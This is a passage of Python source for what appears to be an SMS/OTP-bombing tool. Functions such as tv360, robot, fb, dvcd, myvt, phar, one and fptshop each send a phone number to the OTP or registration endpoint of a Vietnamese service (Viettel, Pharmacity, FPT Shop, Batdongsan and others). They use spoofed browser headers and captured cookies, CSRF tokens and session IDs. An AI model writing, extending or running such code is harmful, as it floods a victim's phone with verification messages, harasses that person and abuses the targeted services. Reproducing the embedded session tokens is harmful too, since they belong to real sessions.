_ga_HXMGB9WRVX=GS1.1.1721136159.1.1.1721137833.60.0.0; _ga_CDD1S5P7D4=GS1.1.1721136165.1.1.1721137833.49.0.0; _ga_Y9YZPDEGP0=GS1.1.1721136163.1.1.1721137833.49.0.0; _ga_EBZKH8C7MK=GS1.2.1721136166.1.1.1721137833.0.0.0; _ga_P9DPF3E00F=GS1.1.1721136112.1.1.1721137846.0.0.0; _ga_8Z6MB85ZM2=GS1.1.1721136165.1.1.1721137847.35.0.0; _ce.s=v~a9bf0cd0d29c960e5bff8890efefc88e208d7385~lcw~1721137874051~lva~1721136168617~vpv~0~v11.fhb~1721136169125~v11.lhb~1721137827515~v11.cs~200798~v11.s~7f389030-4376-11ef-8b30-7911946dbf22~v11.sla~1721137874457~lcw~1721137874457; _gcl_au=1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
    'origin': 'https://www.sapo.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    data = {
    'phonenumber': phone,
}

    response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
def tv360(phone):
  data = '{"msisdn":"phone"}'
  data = data.replace("phone",phone)
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json"
  }
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
#
def robot(phone):
    cookies = {
    '_fbp': 'fb.1.1720102725444.358598086701375218',
    '_gcl_au': '1.1.619229570.1720102726',
    'mousestats_vi': 'acaa606972ae539932c0',
    '_tt_enable_cookie': '1',
    '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
    '_ym_uid': '1720102728534641572',
    '_ym_d': '1720102728',
    '_gid': 'GA1.2.557208002.1720622172',
    '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
    '_ym_isad': '2',
    '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
    '_ym_visorc': 'w',
    'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.1882430469.1720102726',
    'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_png_client': 'false',
    'ec_png_client_utm': 'null',
    'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': 'null',
    'ec_etag_client': 'false',
    'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_etag_client_utm': 'null',
    '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
    '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
    'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'client': 'false',
    'client_utm': 'null',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
    'origin': 'https://vietloan.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vietloan.vn/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
    '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
}

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
def fb(phone):
    cookies = {
    'con.unl.lat': '1720112400',
    'con.unl.sc': '1',
    '_gid': 'GA1.3.2048602791.1720189695',
    '_tt_enable_cookie': '1',
    '_ttp': 'loSwVu_AC7yj50Md2HhAQPUajHo',
    '_clck': 'k364l7%7C2%7Cfn7%7C0%7C1647',
    '_fbp': 'fb.2.1720189698853.917828572155116943',
    '_hjSessionUser_1708983': 'eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
    '__zi': '3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1',
    '_gcl_au': '1.1.888803755.1720189704',
    'con.ses.id': '684bd57c-05df-40e6-8f09-cb91b12b83ee',
    '_cfuvid': '7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000',
    '_gat_UA-3729099-1': '1',
    '_hjSession_1708983': 'eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=',
    '_hjHasCachedUserAttributes': 'true',
    '__gads': 'ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg',
    '__gpi': 'UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ',
    '__eoi': 'ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu',
    'cf_clearance': 'CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A',
    'ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D',
    'ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D',
    '_ga': 'GA1.3.697835917.1720189695',
    '_clsk': 'lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect',
    'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D',
    'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D',
    '_ga_HTS298453C': 'GS1.1.1720194528.2.1.1720194561.27.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    # 'cookie': 'con.unl.lat=1720112400; con.unl.sc=1; _gid=GA1.3.2048602791.1720189695; _tt_enable_cookie=1; _ttp=loSwVu_AC7yj50Md2HhAQPUajHo; _clck=k364l7%7C2%7Cfn7%7C0%7C1647; _fbp=fb.2.1720189698853.917828572155116943; _hjSessionUser_1708983=eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==; __zi=3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1; _gcl_au=1.1.888803755.1720189704; con.ses.id=684bd57c-05df-40e6-8f09-cb91b12b83ee; _cfuvid=7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000; _gat_UA-3729099-1=1; _hjSession_1708983=eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _hjHasCachedUserAttributes=true; __gads=ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg; __gpi=UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ; __eoi=ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu; cf_clearance=CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A; ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D; ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D; _ga=GA1.3.697835917.1720189695; _clsk=lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D; _ga_HTS298453C=GS1.1.1720194528.2.1.1720194561.27.0.0',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    params = {
    'phoneNumber': phone,
}

    response = requests.get(
    'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
    params=params,
    cookies=cookies,
    headers=headers,
)

def dvcd(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
   
###
def myvt(phone):
    cookies = {
        'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
        '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
        'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
         'Cookie': 'laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
    
##
   
###
  
###
def phar(phone):
    headers = {
        'authority': 'data-service.pharmacity.io',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'dnt': '1',
        'referer': 'https://www.pharmacity.vn/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    response = requests.get(
        'https://data-service.pharmacity.io/pmc-ecm-webapp-config-api/production/banner/654%20x%20324-1684304235294.png',
        headers=headers,
    )


    headers = {
        'authority': 'api-gateway.pharmacity.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'access-control-request-headers': 'content-type',
        'access-control-request-method': 'POST',
        'origin': 'https://www.pharmacity.vn',
        'referer': 'https://www.pharmacity.vn/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    response = requests.options('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers)


    headers = {
        'authority': 'api-gateway.pharmacity.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.pharmacity.vn',
        'referer': 'https://www.pharmacity.vn/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'referral': '',
    }

    response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data)
   
####
def one(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    params = {
    'msisdn': phone,
    'languageCode': 'vi',
}

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
   
##
def fptshop(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://fptshop.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://fptshop.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'fromSys': 'WEBKHICT',
    'otpType': '0',
    'phoneNumber': phone,
}

    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
 
#####
###
  
####
def meta(phone):
    cookies = {
    '_ssid': 'vhs1wox2wourjpxsr55hygiu',
    '_cart_': '50568886-ac95-4d4b-b7e3-7819d23d7e44',
    '_gcl_au': '1.1.1853648441.1720104054',
    '__ckmid': '533492a097c04aa18d6dc2d81118d705',
    '_gid': 'GA1.2.95221250.1720104055',
    '_gat_UA-1035222-8': '1',
    '_ga': 'GA1.1.172471248.1720104055',
    '.mlc': 'eyJjaXR5IjoiQ+AgTWF1IiwiY291bnRyeSI6IlZOIn0=',
    '_clck': 'lpzudx%7C2%7Cfn6%7C0%7C1646',
    '_clsk': '1j3awjd%7C1720104063602%7C1%7C1%7Cu.clarity.ms%2Fcollect',
    '_ga_YE9QV6GZ0S': 'GS1.1.1720104062.1.1.1720104068.0.0.0',
    '_ga_L0FCVV58XQ': 'GS1.1.1720104056.1.1.1720104070.46.0.0',
}

